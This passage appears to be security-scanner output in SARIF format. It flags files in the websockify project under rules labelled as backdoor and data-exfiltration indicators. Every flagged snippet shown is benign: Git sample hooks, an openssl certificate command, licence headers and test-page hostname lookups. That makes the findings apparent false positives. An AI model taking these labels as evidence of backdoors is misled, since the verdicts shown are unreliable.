                      "markdown": "`then\n\tagainst=HEAD\nelse\n\t# Initial commit: diff against an empty tree object\n\tagainst=$(git hash-object -t tree /dev/null)\nfi\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 25,
                  "endLine": 10,
                  "endColumn": 31,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 10,
                  "startColumn": 2,
                  "endLine": 10,
                  "endColumn": 7,
                  "snippet": {
                    "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                    "rendered": {
                      "text": "#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n",
                      "markdown": "`#\n# To enable this hook, rename this file to \"pre-commit\".\n\nif git rev-parse --verify HEAD >/dev/null 2>&1\nthen\n\tagainst=HEAD\nelse\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-commit.sample"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 17,
                  "endLine": 3,
                  "endColumn": 25,
                  "snippet": {
                    "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n",
                    "rendered": {
                      "text": "#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n",
                      "markdown": "`#!/bin/sh\n#\n# An example hook script to verify what is about to be committed.\n# Called by \"git commit\" with no arguments.  The hook should\n# exit with non-zero status after issuing an appropriate message if\n# it wants to stop the commit.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 161,
                  "startColumn": 45,
                  "endLine": 161,
                  "endColumn": 49,
                  "snippet": {
                    "text": "\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n",
                    "rendered": {
                      "text": "\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n",
                      "markdown": "`\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\nTo compute (2):\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 151,
                  "startColumn": 29,
                  "endLine": 151,
                  "endColumn": 33,
                  "snippet": {
                    "text": " * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n",
                    "rendered": {
                      "text": " * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n",
                      "markdown": "` * B has finished.  It has been fully merged up to \"master\" and \"next\",\n   and is ready to be deleted.\n\n * C has not merged to \"next\" at all.\n\nWe would want to allow C to be rebased, refuse A, and encourage\nB to be deleted.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 131,
                  "startColumn": 10,
                  "endLine": 131,
                  "endColumn": 14,
                  "snippet": {
                    "text": "    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n",
                    "rendered": {
                      "text": "    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n",
                      "markdown": "`    fork the topic (perhaps with the same name) afresh from the\n    tip of \"master\".\n\nLet's look at this example:\n\n\t\t   o---o---o---o---o---o---o---o---o---o \"next\"\n\t\t  /       /           /           /\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 103,
                  "startColumn": 61,
                  "endLine": 104,
                  "snippet": {
                    "text": "\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n",
                    "rendered": {
                      "text": "\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n",
                      "markdown": "`\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n\n * Whenever you need to test or publish your changes to topic\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 165,
                  "endLine": 165,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n",
                    "rendered": {
                      "text": "\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n",
                      "markdown": "`\nTo compute (2):\n\n\tgit rev-list master..topic\n\n\tif this is empty, it is fully merged to \"master\".\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 159,
                  "endLine": 159,
                  "endColumn": 5,
                  "snippet": {
                    "text": "To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n",
                    "rendered": {
                      "text": "To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n",
                      "markdown": "`To compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 158,
                  "endLine": 158,
                  "endColumn": 5,
                  "snippet": {
                    "text": "\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n",
                    "rendered": {
                      "text": "\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n",
                      "markdown": "`\nTo compute (1):\n\n\tgit rev-list ^master ^topic next\n\tgit rev-list ^master        next\n\n\tif these match, topic has not merged in next at all.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 125,
                  "startColumn": 12,
                  "endLine": 125,
                  "endColumn": 17,
                  "snippet": {
                    "text": "\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n",
                    "rendered": {
                      "text": "\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n",
                      "markdown": "`\n(2) ... if a topic branch has been fully merged to \"master\".\n    Then you can delete it.  More importantly, you should not\n    build on top of it -- other people may already want to\n    change things related to the topic as patches against your\n    \"master\", so if you need further changes, it is better to\n    fork the topic (perhaps with the same name) afresh from the\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 102,
                  "startColumn": 42,
                  "endLine": 102,
                  "endColumn": 47,
                  "snippet": {
                    "text": "   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n",
                    "rendered": {
                      "text": "   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n",
                      "markdown": "`   merged into it again (either directly or indirectly).\n\n * Once a topic branch is fully cooked and merged into \"master\",\n   it is deleted.  If you need to build on top of it to correct\n   earlier mistakes, a new topic branch is created by forking at\n   the tip of the \"master\".  This is not strictly necessary, but\n   it makes it easier to keep your history simple.\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 39,
                  "startColumn": 30,
                  "endLine": 40,
                  "endColumn": 4,
                  "snippet": {
                    "text": "# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n",
                    "rendered": {
                      "text": "# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n",
                      "markdown": "`# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n\techo >&2 \"No such branch $topic\"\n\texit 1\n}\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 37,
                  "startColumn": 4,
                  "endLine": 37,
                  "endColumn": 9,
                  "snippet": {
                    "text": "esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n",
                    "rendered": {
                      "text": "esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n",
                      "markdown": "`esac\n\n# Now we are dealing with a topic branch being rebased\n# on top of master.  Is it OK to rebase it?\n\n# Does the topic really exist?\ngit show-ref -q \"$topic\" || {\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/.git/hooks/pre-rebase.sample"
                },
                "region": {
                  "startLine": 25,
                  "startColumn": 48,
                  "endLine": 26,
                  "snippet": {
                    "text": "\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n",
                    "rendered": {
                      "text": "\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n",
                      "markdown": "`\ttopic=\"refs/heads/$2\"\nelse\n\ttopic=`git symbolic-ref HEAD` ||\n\texit 0 ;# we do not interrupt rebasing detached HEAD\nfi\n\ncase \"$topic\" in\nrefs/heads/??/*)\n`"
                    }
                  },
                  "sourceLanguage": "Unknown"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/load.html"
                },
                "region": {
                  "startLine": 218,
                  "startColumn": 103,
                  "endLine": 218,
                  "endColumn": 111,
                  "snippet": {
                    "text": "        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n        }\n    </script>\n",
                    "rendered": {
                      "text": "        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n        }\n    </script>\n",
                      "markdown": "`        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n        }\n    </script>\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/echo.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 43,
                  "endLine": 9,
                  "endColumn": 8,
                  "snippet": {
                    "text": "Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n\n",
                    "rendered": {
                      "text": "Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n\n",
                      "markdown": "`Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/echo.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 28,
                  "endLine": 8,
                  "endColumn": 37,
                  "snippet": {
                    "text": "Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n",
                    "rendered": {
                      "text": "Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n",
                      "markdown": "`Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/latency.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 43,
                  "endLine": 9,
                  "endColumn": 8,
                  "snippet": {
                    "text": "Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n\n",
                    "rendered": {
                      "text": "Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n\n",
                      "markdown": "`Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/latency.py"
                },
                "region": {
                  "startLine": 8,
                  "startColumn": 28,
                  "endLine": 8,
                  "endColumn": 37,
                  "snippet": {
                    "text": "Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n",
                    "rendered": {
                      "text": "Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n",
                      "markdown": "`Copyright 2010 Joel Martin\nLicensed under LGPL version 3 (see docs/LICENSE.LGPL-3)\n\nYou can make a cert/key with openssl using:\nopenssl req -new -x509 -days 365 -nodes -out self.pem -keyout self.pem\nas taken from http://docs.python.org/dev/library/ssl.html#certificates\n'''\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000600"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Windows Indicator",
            "id": "BD000600"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websocketproxy.py"
                },
                "region": {
                  "startLine": 7,
                  "startColumn": 26,
                  "endLine": 8,
                  "snippet": {
                    "text": "#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n",
                    "rendered": {
                      "text": "#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n",
                      "markdown": "`#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n#    a copy of the License at\n#\n#         http://www.apache.org/licenses/LICENSE-2.0\n#\n#    Unless required by applicable law or agreed to in writing, software\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000610"
          },
          "message": {
            "text": "Backdoor: LOLBAS: Linux Indicator",
            "id": "BD000610"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/test_websocketproxy.py"
                },
                "region": {
                  "startLine": 3,
                  "startColumn": 19,
                  "endLine": 3,
                  "endColumn": 24,
                  "snippet": {
                    "text": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright(c) 2015 Red Hat, Inc All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n",
                    "rendered": {
                      "text": "# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright(c) 2015 Red Hat, Inc All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n",
                      "markdown": "`# vim: tabstop=4 shiftwidth=4 softtabstop=4\n\n# Copyright(c) 2015 Red Hat, Inc All Rights Reserved.\n#\n#    Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n#    not use this file except in compliance with the License. You may obtain\n`"
                    }
                  },
                  "sourceLanguage": "python"
                }
              }
            }
          ],
          "properties": {
            "Severity": 4,
            "Confidence": 1
          }
        },
        {
          "rule": {
            "id": "BD000704"
          },
          "message": {
            "text": "Backdoor: Data Exfiltration (Hostname)",
            "id": "BD000704"
          },
          "locations": [
            {
              "physicalLocation": {
                "address": {
                  "relativeAddress": -1,
                  "fullyQualifiedName": "/datasets/dataset4/python/websockify.zip/tests/echo.html"
                },
                "region": {
                  "startLine": 134,
                  "startColumn": 103,
                  "endLine": 134,
                  "endColumn": 111,
                  "snippet": {
                    "text": "        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n        }\n    </script>\n",
                    "rendered": {
                      "text": "        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n        }\n    </script>\n",
                      "markdown": "`        window.onload = function() {\n            console.log(\"onload\");\n            var url = document.location.href;\n            document.getElementById('host').value = (url.match(/host=([^&#]*)/) || ['',window.location.hostname])[1];\n            document.getElementById('port').value = (url.match(/port=([^&#]*)/) || ['',window.location.port])[1];\n        }\n    </script>\n`"
                    }
                  },
                  "sourceLanguage": "html"
                }
              }
            }
          ],
          "properties": {
            "Severity": 2,
